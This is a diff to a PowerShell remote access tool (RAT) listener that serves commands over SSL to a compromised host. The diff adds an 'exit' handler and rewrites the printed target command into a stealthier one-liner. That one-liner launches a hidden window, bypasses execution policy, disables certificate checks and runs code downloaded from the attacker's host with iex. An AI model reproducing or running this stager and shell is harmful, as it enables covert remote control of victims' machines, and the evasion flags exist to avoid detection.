@@ -140,6 +140,15 @@ do
     if ($SSLUrl -eq '/rat' -and ($SSLMethod-eq "GET")) {  
 	
     $Command = Read-Host "PS $RemoteAddr>"
+    if ($Command -eq "exit")
+    {
+        $SSLResponse += "$Command"
+        [byte[]] $Buffer = [System.Text.Encoding]::UTF8.GetBytes($SSLResponse)
+        $SSLStream.Write($Buffer, 0, $Buffer.length)
+        $Client.Close()
+        $listener.Stop()
+        break
+    }
     $SSLResponse += "$Command"
 
 
@@ -162,7 +171,7 @@ do
     $listener.Start()
     Write-Output "Listening on $Port"
     Write-Output "Run the following command on the target:"
-    Write-Output "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true};iex (New-Object Net.WebClient).DownloadString(""https://$IPAddress`:$Port/connect"")"
+    Write-Output "powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true};iex ((New-Object Net.WebClient).DownloadString('https://$IPAddress`:$Port/connect'))"
 
     $Client = New-Object System.Net.Sockets.TcpClient
     $Client.NoDelay = $true
